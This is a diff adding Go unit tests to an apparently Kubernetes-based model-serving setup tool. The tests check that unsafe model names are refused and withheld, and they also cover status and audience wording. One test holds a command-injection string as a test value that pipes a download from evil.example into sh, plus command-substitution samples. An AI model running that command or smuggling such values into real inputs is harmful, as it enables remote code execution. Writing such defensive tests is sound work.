@@ -231,6 +231,42 @@ func TestModelsSetup_CanItBeCalled(t *testing.T) {
 	}
 }
 
+// A project editor sets spec.model.name (KServe and vLLM take any string):
+// a name with characters a shell or JSON treats specially is never shown,
+// and the call check does not use it.
+func TestModels_UnsafeServedNameWithheld(t *testing.T) {
+	for _, name := range []string{`x"}'; curl -s https://evil.example/p|sh; echo '`, "a$(id)", "a`id`", "two\nlines", "a b", ""} {
+		if name != "" && safeServedName(name) {
+			t.Errorf("%q is taken as safe", name)
+		}
+	}
+	for _, name := range []string{"qwen25-05b-instruct", "Qwen/Qwen2.5-0.5B-Instruct", "model:v1.2_x"} {
+		if !safeServedName(name) {
+			t.Errorf("%q is refused", name)
+		}
+	}
+	mc := newModelsCluster(t)
+	if res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"}); !res.Success {
+		t.Fatalf("setup: %+v", res)
+	}
+	obj := mc.f.get(testModelPath)
+	ensureMap(ensureMap(obj, "spec"), "model")["name"] = `x"}'; curl -s https://evil.example/p|sh; echo '`
+	mc.f.put(testModelPath, obj)
+	before := len(mc.calls.sent())
+	res, _ := runModels(t, mc.c, types.ModelsRequest{Action: "check", Project: "proj"})
+	if !strings.HasPrefix(res.Message, "Not checked") || len(mc.calls.sent()) != before {
+		t.Fatalf("check: %+v; calls %v", res, mc.calls.sent()[before:])
+	}
+	st, _ := GetResourcesStatus(mc.c)
+	m := st.Models.Items[0]
+	if m.ServedName != "" || !m.ServedNameWithheld || !strings.Contains(m.Warning, "does not show it") {
+		t.Errorf("status: %+v", m)
+	}
+	if m.CallCheck == nil || m.CallCheck.Result != "not-checked" || strings.Contains(m.CallCheck.Message, "evil") {
+		t.Errorf("call check: %+v", m.CallCheck)
+	}
+}
+
 func eventMessages(events []UpdateStepEvent, step string) []string {
 	var out []string
 	for _, e := range events {
@@ -333,5 +369,41 @@ func TestModelsBlock_ConnectivityLinkAloneIsNoBlock(t *testing.T) {
 	}
 	if b, _ := modelsBlock(dsc("cert-manager Operator for Red Hat OpenShift is not installed")); b == nil {
 		t.Error("cert-manager missing is a block")
+	}
+}
+
+// The model step says how it is reached in a sentence of its own.
+func TestModelsSetup_ModelStepSaysHowItIsReached(t *testing.T) {
+	mc := newModelsCluster(t)
+	_, events := runModels(t, mc.c, types.ModelsRequest{Action: "setup", Gateway: true, Project: "proj"})
+	msgs := strings.Join(eventMessages(events, "model"), "\n")
+	if !strings.Contains(msgs, "with the cluster preset's Red Hat vLLM CPU image. Reached through gateway openshift-ingress/openshift-ai-inference, KServe's default.") {
+		t.Fatalf("model step: %s", msgs)
+	}
+}
+
+// The "Through MaaS only" option says who can call the model: publish
+// keeps the subscription's audience, so not "anyone signed in" when it is
+// limited; and an unread MaaS state says so in words.
+func TestModelExposures_MaaSOptionNamesTheAudience(t *testing.T) {
+	entry, _ := catalogEntry("")
+	maasOpt := func(r exposureReads) types.ModelExposureOption {
+		out, _ := r.options()
+		for _, o := range out.Options {
+			if o.Key == exposureMaaS {
+				return o
+			}
+		}
+		t.Fatal("no MaaS option")
+		return types.ModelExposureOption{}
+	}
+	if o := maasOpt(exposureReads{project: "p", entry: entry, maasKnown: true}); !strings.Contains(o.Description, "anyone signed in") {
+		t.Errorf("everyone: %s", o.Description)
+	}
+	if o := maasOpt(exposureReads{project: "p", entry: entry, maasKnown: true, maasWho: "group team-a"}); strings.Contains(o.Description, "anyone signed in") || !strings.Contains(o.Description, "the same people as this tool's other published models (group team-a)") {
+		t.Errorf("limited: %s", o.Description)
+	}
+	if o := maasOpt(exposureReads{project: "p", entry: entry}); o.Reason != "Whether MaaS is set up could not be checked yet." {
+		t.Errorf("not checked: %s", o.Reason)
 	}
 }
